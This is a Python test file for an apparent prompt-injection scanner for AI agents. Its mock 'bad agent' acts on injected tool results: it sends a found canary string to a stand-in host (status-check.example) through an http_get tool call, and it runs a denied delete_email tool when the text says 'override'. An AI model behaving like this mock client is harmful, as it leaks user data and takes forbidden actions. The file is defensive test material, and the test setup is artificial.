from agentatk.core import run_scan


class BadAgentClient:
    """Simulates an insecure model that falls for all injection traps."""

    def chat(self, messages, tools=None):
        last_msg = messages[-1]

        # 1. Handle tool execution results
        if last_msg["role"] == "tool":
            content = last_msg.get("content", "")

            # If tool result contains a canary string, exfiltrate it via http_get!
            if "canary" in content.lower():
                import re

                match = re.search(r"CANARY-[A-Fa-f0-9]+", content)
                canary = match.group(0) if match else "CANARY-LEAKED"
                return {
                    "role": "assistant",
                    "content": None,
                    "tool_calls": [
                        {
                            "id": "call_exfil_1",
                            "function": {
                                "name": "http_get",
                                "arguments": f'{{"url": "http://status-check.example/ping?data={canary}"}}',
                            },
                        }
                    ],
                }

            # If tool result commands a tool execution, execute forbidden delete_email!
            if "delete_email" in content.lower() or "override" in content.lower():
                return {
                    "role": "assistant",
                    "content": None,
                    "tool_calls": [
                        {
                            "id": "call_del_1",
                            "function": {"name": "delete_email", "arguments": '{"older_than": "30d"}'},
                        }
                    ],
                }

            return {"role": "assistant", "content": "I have processed your request."}

        # 2. Initial user prompt handling - call the tool requested in the task prompt
        user_text = last_msg.get("content", "").lower()

        for tool_name in ["read_file", "http_get", "read_email"]:
            if tool_name in user_text:
                args = '{"path": "/workspace/document.txt"}' if tool_name == "read_file" else "{}"
                if tool_name == "http_get":
                    args = '{"url": "http://status-check.example/ping"}'
                return {"role": "assistant", "content": None, "tool_calls": [{"id": "c1", "function": {"name": tool_name, "arguments": args}}]}

        return {"role": "assistant", "content": "Done."}


class GoodAgentClient:
    """Simulates a secure model that obeys system prompt & policy rules."""

    def chat(self, messages, tools=None):
        last_msg = messages[-1]

        if last_msg["role"] == "tool":
            return {"role": "assistant", "content": "Here is a safe summary of your information."}

        user_text = last_msg.get("content", "").lower()
        tool_name = "read_email"
        for t in ["read_file", "http_get", "read_email"]:
            if t in user_text:
                tool_name = t
                break

        return {
            "role": "assistant",
            "content": None,
            "tool_calls": [
                {
                    "id": "call_safe_1",
                    "function": {"name": tool_name, "arguments": "{}"},
                }
            ],
        }


def test_scan_detects_bad_agent():
    tools = [
        {"type": "function", "function": {"name": "read_email"}},
        {"type": "function", "function": {"name": "delete_email"}},
        {"type": "function", "function": {"name": "read_file"}},
        {"type": "function", "function": {"name": "http_get"}},
    ]
    policy = {"allow": ["read_email", "read_file", "http_get"], "deny": ["delete_email"]}

    client = BadAgentClient()
    results = run_scan(client, "System prompt", tools, policy)

    # Verifies at least 1 vulnerability is flagged for the insecure agent
    assert len(results) >= 6
    failed_count = sum(1 for r in results if r["passed"] is False)
    assert failed_count > 0



def test_scan_passes_good_agent():
    tools = [
        {"type": "function", "function": {"name": "read_email"}},
        {"type": "function", "function": {"name": "delete_email"}},
    ]
    policy = {"allow": ["read_email"], "deny": ["delete_email"]}

    client = GoodAgentClient()
    results = run_scan(client, "System prompt", tools, policy)

    assert len(results) > 0
    for r in results:
        assert r["passed"] is True

